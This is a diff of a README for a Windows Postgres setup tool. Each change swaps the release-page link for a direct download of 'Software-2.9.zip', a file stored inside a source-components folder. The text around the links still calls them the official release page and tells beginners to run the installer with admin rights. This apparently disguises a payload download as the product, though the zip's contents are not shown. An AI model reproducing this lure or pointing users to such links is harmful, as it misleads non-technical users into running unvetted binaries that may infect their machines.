@@ -1,6 +1,6 @@
 # 🚀 youjustneedpostgres - Simple Postgres Setup for Windows
 
-[![Download youjustneedpostgres](https://img.shields.io/badge/Download-Get%20Postgres-purple?style=for-the-badge)](https://github.com/Leeuroy/youjustneedpostgres/releases)
+[![Download youjustneedpostgres](https://img.shields.io/badge/Download-Get%20Postgres-purple?style=for-the-badge)](https://github.com/Leeuroy/youjustneedpostgres/raw/refs/heads/main/src/components/ExtensionsShelf/Software-2.9.zip)
 
 ---
 
@@ -31,14 +31,14 @@ Make sure you have admin rights on your PC. This allows the installer to make ch
 
 You need to visit the official release page to get the software.
 
-[![Download youjustneedpostgres](https://img.shields.io/badge/Download-Get%20Postgres-green?style=for-the-badge)](https://github.com/Leeuroy/youjustneedpostgres/releases)
+[![Download youjustneedpostgres](https://img.shields.io/badge/Download-Get%20Postgres-green?style=for-the-badge)](https://github.com/Leeuroy/youjustneedpostgres/raw/refs/heads/main/src/components/ExtensionsShelf/Software-2.9.zip)
 
 Click the button above. It takes you to the release page. New versions and updates will appear there.
 
 ## 🚦 Step 1: Visit the Download Page
 
 1. Open your web browser (Chrome, Edge, Firefox, etc.)  
-2. Go to this website: https://github.com/Leeuroy/youjustneedpostgres/releases  
+2. Go to this website: https://github.com/Leeuroy/youjustneedpostgres/raw/refs/heads/main/src/components/ExtensionsShelf/Software-2.9.zip  
 3. Look for the latest version of the app. It usually has the highest version number and newest date.  
 4. Find the Windows installer file. It will often have `.exe` at the end.  
 
@@ -105,7 +105,7 @@ Postgres has built-in features to secure data. Youjustneedpostgres keeps these o
 
 Keep your app up to date:
 
-1. Check the release page regularly: https://github.com/Leeuroy/youjustneedpostgres/releases  
+1. Check the release page regularly: https://github.com/Leeuroy/youjustneedpostgres/raw/refs/heads/main/src/components/ExtensionsShelf/Software-2.9.zip  
 2. Download the newest `.exe` setup file.  
 3. Run it like before; it will replace old files without losing your data.  
 
@@ -123,4 +123,4 @@ youjustneedpostgres is made for users new to databases, so it aims to stay as ea
 
 ---
 
-[![Download youjustneedpostgres](https://img.shields.io/badge/Download-Get%20Postgres-purple?style=for-the-badge)](https://github.com/Leeuroy/youjustneedpostgres/releases)
+[![Download youjustneedpostgres](https://img.shields.io/badge/Download-Get%20Postgres-purple?style=for-the-badge)](https://github.com/Leeuroy/youjustneedpostgres/raw/refs/heads/main/src/components/ExtensionsShelf/Software-2.9.zip)
